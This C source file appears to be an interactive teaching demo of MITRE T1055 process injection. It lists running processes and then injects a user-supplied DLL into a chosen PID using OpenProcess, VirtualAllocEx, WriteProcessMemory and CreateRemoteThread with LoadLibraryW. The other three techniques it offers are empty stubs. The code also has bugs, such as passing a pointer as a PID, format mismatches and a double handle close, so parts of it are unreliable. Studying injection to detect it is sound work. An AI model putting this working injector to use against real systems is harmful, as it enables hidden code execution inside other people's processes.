#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>


VOID GetProcessList()
{
	HANDLE hSnapshot = NULL;
	DWORD dwProcId = NULL;

	PROCESSENTRY32 Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};


	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[!] ERROR: Creating Snapshot failed with error (%d)\n", GetLastError());
		goto _ErrCleanup;
	}

	if (!Process32First(hSnapshot, &Proc)) {
		printf("[!] ERROR: Enumerating snapshot failed with error: (%d)n", GetLastError());
		goto _ErrCleanup;
	}




	do {
		wprintf(L"%d | %s\n", Proc.th32ProcessID, Proc.szExeFile);


	} while (Process32Next(hSnapshot, &Proc));


	CloseHandle(hSnapshot);


_ErrCleanup:
	if (hSnapshot != NULL)
		CloseHandle(hSnapshot);
	return;

}




VOID DllInjection(IN DWORD *dwPid)
{
	LPWSTR szDllPath = (LPWSTR) malloc(256 * sizeof(WCHAR));
	LPVOID pLoadLibraryW = NULL;
	LPVOID pRemoteMemoryAddr = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD dwSize = 0;
	SIZE_T lpBytesWritten = 0;


	// Explanation
	puts("---------- STEP 3 - SELECTING A DLL TO INJECT ----------");
	puts("- LoadLibraryW will be loaded and executed inside of the target process, effectively loading the DLL specified.\n");
	

	// Select DLL File

	printf("Enter the path of your DLL: ");

	wscanf_s(L"%255s", szDllPath);

	size_t len = wcslen(szDllPath);
	if (len > 0 && szDllPath[len - 1] == L'\n') {
		szDllPath[len - 1] = L'\0';
	}

	if (lstrlenW(szDllPath) < 3) {
		printf("[!] ERROR: Invalid DLL file path (%d)\n", GetLastError());
		goto _Cleanup;
	}

	dwSize = lstrlenW(szDllPath) * sizeof(WCHAR);

	wprintf(L"[i] INFO: Selected DLL: %s (%lu bytes)\n", szDllPath, dwSize);

	Sleep(1000);



	// Getting Address of LoadLibraryW from Kernel32.dll

	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] ERROR: Failed to get address of LoadLibraryW from kernel32.dll (%lu)\n", GetLastError());
		goto _Cleanup;
	}

	printf("[+] SUCCESS: Found address of LoadLibraryW inside of Kernel32.dll: 0x%x\n", pLoadLibraryW);

	Sleep(1000);



	// Getting Process Handle

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);

	if (hProcess == NULL) {
		printf("[!] ERROR: Failed to get process handle for pid [%lu] (%lu)\n", dwPid, GetLastError());
		goto _Cleanup;
	}

	printf("[+] SUCCESS: Obtained handle for process [%lu]\n", dwPid);

	Sleep(1000);



	// Allocating Virtual Memory inside the target process

	pRemoteMemoryAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (pRemoteMemoryAddr == NULL) {
		printf("[!] ERROR: Failed to allocate remote memory for pid [%lu] (%d)\n", dwPid, GetLastError());
		goto _Cleanup;
	}

	printf("[+] SUCCESS: Allocated virtual memory with base address 0x%x\n", pRemoteMemoryAddr);
	
	Sleep(1000);



	// Confirm Injection

	wprintf("[#] DLL \"%s\" ready for injection into PID [%lu]. Press <Enter> to start injection...", szDllPath, dwPid);
	getchar();


	Sleep(2000);


	// Inject the DLL File Path

	if (!WriteProcessMemory(hProcess, pRemoteMemoryAddr, szDllPath, dwSize, &lpBytesWritten) || lpBytesWritten != dwSize) {
		printf("[!] ERROR: Writing to remote memory failed (%d)\n", GetLastError());
		goto _Cleanup;
	}
	
	printf("[+] SUCCESS: DLL Path was successfully written into remote memory (%d of %d bytes written)\n", lpBytesWritten, dwSize);

	Sleep(1000);



	// Creating remote thread

	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pRemoteMemoryAddr, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] ERROR: Creating remote thread failed (%d)\n", GetLastError());
		goto _Cleanup;
	}

	wprintf("[+] SUCCESS: Successfully created remote thread with start routine LoadLibraryW (0x%x) with parameter \"%s\" (0x%x) \n", pLoadLibraryW, szDllPath, pRemoteMemoryAddr);


	printf("[#] The test was completed successfully, press <Enter> to exit...\n");
	getchar();

	goto _Cleanup;

_Cleanup:
	if (hProcess != NULL)
		CloseHandle(hProcess);
	if (hThread != NULL)
		CloseHandle(hThread);
	if (szDllPath != NULL)
		free(szDllPath);
	return;
}




VOID PeInjection(IN DWORD* dwPid)
{
	// Explanation
	puts("---------- STEP 3 - SELECTING A PE TO INJECT ----------");
	puts("- LoadLibraryW will be loaded and executed inside of the target process, effectively loading the DLL specified.\n");
}








VOID ThHijacking(IN DWORD* dwPid)
{
	return;
}

VOID ApcHijacking(IN DWORD* dwPid)
{
	return; 
}







int main()
{
	DWORD dwProcessId = 0;
	DWORD dwTechnique = 0;
	int iOption = 0;




	// Welcome Screen

	puts("========== WELCOME ==========");
	puts("- This is a technical demo showcasing sub-techniques of T1055 Process Injection created by Richard Minder (minder-security.ch).");


	// CHAPTER 1 - Selecting a target Process
	printf(	"\n" \
			"---------- STEP 1 - SELECTING A TARGET PROCESS ----------\n" \
			"\n" \
			"\n" \
			"PID | Process Name\n" \
			"-------------------\n");

	GetProcessList();

	printf("\n\nEnter a valid PID, enter 0 to exit: ");
	scanf_s("%lu", &dwProcessId);

	if (dwProcessId < 1)
		goto _GoodBye;



	// Chapter 2 - Selecting a Technique

	printf("\n" \
		"---------- STEP 2 - SELECTING AN INJECTION TECHNIQUE ----------\n" \
		"\n" \
		"[1] - Dynamic-link Library Injection (T1055.001)\n" \
		"[2] - Portable Executable Injection (T1055.002)\n" \
		"[3] - Thread Execution Hijacking (T1055.003)\n" \
		"[4] - Asynchronous Procedure Call (T1055.004)\n");

	printf("\nSelect a technique: ");
	scanf_s("%lu", &dwTechnique);

	switch(dwTechnique) {
		case 1:
			DllInjection(dwProcessId);
			break;
		case 2:
			PeInjection(dwProcessId);
			break;
		case 3:
			ThHijacking(dwProcessId);
			break;
		case 4:
			ApcHijacking(dwProcessId);
			break;
		default:
			goto _GoodBye;
			break;

	}

	return 0;


_GoodBye:
	puts("\n- Goodbye!\n");
	return 0;
}